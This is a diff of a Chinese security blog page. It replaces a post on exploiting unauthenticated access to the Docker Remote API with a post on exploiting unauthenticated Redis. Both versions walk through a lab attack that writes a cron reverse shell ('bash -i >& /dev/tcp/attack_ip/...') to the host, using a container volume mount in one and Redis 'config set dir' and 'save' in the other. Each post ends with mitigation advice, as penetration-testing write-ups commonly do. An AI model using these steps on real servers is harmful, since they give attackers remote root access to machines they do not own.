@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Tachiu Lam">
   <meta name="keywords" content="">
-  <title>Docker Remote API 未授权访问漏洞利用 - Tachiu Lam</title>
+  <title>Redis未授权访问漏洞利用 - Tachiu Lam</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -119,7 +119,7 @@
 </nav>
 
     <div class="view intro-2" id="background" parallax=true
-         style="background: url('/img/docker.png') no-repeat center center;
+         style="background: url('/img/redis.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -132,8 +132,8 @@
               
                 <div class="mt-3 post-meta">
                   <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-                  <time datetime="2020-05-23 18:10">
-                    2020年5月23日 晚上
+                  <time datetime="2020-05-25 22:48">
+                    2020年5月25日 晚上
                   </time>
                 </div>
               
@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    684 字
+                    567 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    8
+                    7
                      分钟
                   </span>
                 
@@ -183,45 +183,53 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年5月24日 晚上
+                  本文最后更新于：2020年5月25日 晚上
                 
               </p>
             
             <article class="markdown-body">
-              <h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</p>
-<p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><pre><code class="hljs plain"># 靶机IP&#x2F;端口
-172.19.101.34 2375
-# 操作系统
-linux_x86</code></pre>
-<h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker tcp:&#x2F;&#x2F;172.19.101.34:2375 --version
+              <h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><pre><code class="hljs plain"># redis安装
+wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gz
+tar -xvzf redis-3.2.0.tar.gz
+cd redis-3.2.0
+make
 
-# 返回版本信息，漏洞存在
-Docker version 19.03.5, build 633a0ea</code></pre>
-<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听
-[root@]# nc -vv -l -p 8088</code></pre>
-<h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p>
-<pre><code class="hljs plain"># 查看宿主机可用镜像
-docker tcp:&#x2F;&#x2F;172.19.101.34:2375 image
+# 修改配置文件
+vim redis.conf
+# bind 127.0.0.1               前面加上#号    
+# protected-mode设为no 
+protected-mode no
+# 保存退出
+# 启动redis-server
+redis-server redis-conf</code></pre>
+<p>观察到如下输出，漏洞环境搭建成功<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开9999端口监听
+[root@]# nc -vv -l -p 9999</code></pre>
+<h5 id="未授权访问验证"><a href="#未授权访问验证" class="headerlink" title="未授权访问验证"></a>未授权访问验证</h5><pre><code class="hljs plain"># 连接靶机redis
+redis -h target_ip
 
-# 选择合适镜像创建容器
-docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash
+# 获取redis版本等信息
+target_ip&gt; info</code></pre>
+<p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p>
+<h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><pre><code class="hljs plain"># 设置变量
+target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;
+OK
 
-# 启动刚刚创建的容器并连接
-docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_id
-docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash
-
-# 执行shell反弹命令
-root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre>
-<h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p>
+# 修改redis默认目录和rdb文件
+target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron
+OK
+target_ip:6379&gt; config set dbfilename root
+OK
+target_ip:6379&gt; save
+OK</code></pre>
+<h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p>
 <blockquote>
-<p>P.S ，测试完记得删掉存在漏洞的容器</p>
+<p>P.S ，测试完记得关闭存在漏洞的redis</p>
 </blockquote>
-<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>临时解决方案：</p>
-<p>1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；</p>
-<p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p>
-<p><strong>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。</strong></p>
-<p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>方法一： 可以修改绑定的IP、端口和指定访问者IP 具体根据实际情况来设定，也可以直接在服务器防火墙上做设置。</p>
+<p>方法二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。</p>
+<p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>
 
             </article>
             <hr>
@@ -252,9 +260,9 @@ root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;t
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                      <a href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Redis未授权访问漏洞利用</span>
+                        <span class="hidden-mobile">PostgreSQL任意命令执行漏洞利用（CVE-2019-9193</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -262,8 +270,8 @@ root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;t
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/05/22/hello-world/">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                        <span class="hidden-mobile">Docker Remote API 未授权访问漏洞利用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -445,7 +453,7 @@ root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;t
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Docker Remote API 未授权访问漏洞利用&nbsp;",
+        "Redis未授权访问漏洞利用&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
